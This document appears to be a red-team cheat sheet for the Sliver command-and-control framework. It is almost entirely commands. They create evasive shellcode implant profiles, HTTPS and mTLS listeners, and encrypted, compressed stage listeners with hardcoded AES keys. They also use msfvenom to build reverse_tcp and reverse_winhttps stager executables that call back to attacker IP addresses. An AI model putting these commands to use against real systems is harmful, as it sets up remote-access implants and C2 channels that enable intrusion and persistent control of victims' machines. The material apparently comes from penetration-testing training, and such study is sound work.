# Sliver C2

## Setup Sliver for SliverLoader or MacroSliver with Encryption, Compression, HTTP(S) as Protocol and TLS

Create Profile
```bash
sliver > profiles new -b https://192.168.8.205:443 --evasion --format shellcode --arch amd64 sliver-amd64
```
For 32 bit payloads use
```bash
sliver > profiles new -b https://192.168.8.205:444 --evasion --format shellcode --arch x86 sliver-x86
```

Setup Listener with certificate for tls
```bash
sliver > https -L 192.168.8.205 -l 443 -c /tmp/certs/crt.crt -k /tmp/certs/key.key
```
```bash
sliver > https -L 192.168.8.205 -l 444 -c /tmp/certs/crt.crt -k /tmp/certs/key.key
```

Setup Stager Listener 
```
sliver > stage-listener --url https://192.168.8.205:8443 --profile sliver-amd64 -c /tmp/crt.crt -k /tmp/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
```
or for 32 bit
```
sliver > stage-listener --url https://192.168.8.205:8444 --profile sliver-x86 -c /tmp/crt.crt -k /tmp/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV
```

## Setup Sliver with mtls and beacon payload and created by msfvenom

Create Profile
```bash
sliver > profiles new beacon --mtls 192.168.45.159:445 --format shellcode msftest
```

```bash
sliver > mtls -L 192.168.45.159 -l 445
```

```bash
sliver > stage-listener -u tcp://192.168.45.159:8080 -p msftest
```

For this, a stager with msfvenom can be created as follows

```bash
msfvenom --payload windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.159 LPORT=8080 --format exe --out stager.exe
```

## Sliver with https and session payload created by msfvenom

Create Profile
```bash
sliver >  profiles new -b https://192.168.45.159:443 --evasion --format shellcode --arch x86 offsec-vba
```

```bash
sliver > https -L 192.168.45.174 -l 443 -c /tmp/google.crt -k /tmp/google.key
```
For stage-listener, `--prepend-size` is required if msfvenom payloads should be used
```bash
sliver > stage-listener --url https://192.168.45.159:10443 --profile offsec-vba -c /htmp/google.crt -k /tmp/google.key --prepend-size
```

For this, a stager with msfvenom can be created as follows

```bash
msfvenom --payload windows/custom/reverse_winhttps LHOST=192.168.45.159 LPORT=10443 LURI=/hello.woff --format exe --out stager.exe
```
if amd64 is used, follow allong but choose aarch amd64 for the profile and the related x64 payload in msfvenom `windows/x64/custom/reverse_winhttps`
